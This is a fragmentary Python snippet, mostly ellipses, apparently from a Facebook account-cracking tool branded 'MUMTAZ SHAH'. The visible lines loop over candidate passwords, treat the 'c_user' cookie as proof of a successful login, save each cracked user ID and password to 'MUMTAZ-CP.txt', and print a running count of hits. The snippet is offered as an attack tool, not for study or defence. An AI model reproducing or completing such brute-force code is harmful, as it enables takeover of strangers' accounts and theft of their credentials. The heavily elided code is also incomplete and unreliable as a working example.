...
logo = """
         ...
         \033[1;37 m\__|  \__|      \_______/ \033[1;32m LPC\033[1;37m 
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('MUMTAZ-CP.txt', 'a').write(uid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r[\033[1;97mMUMTAZ SHAH\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
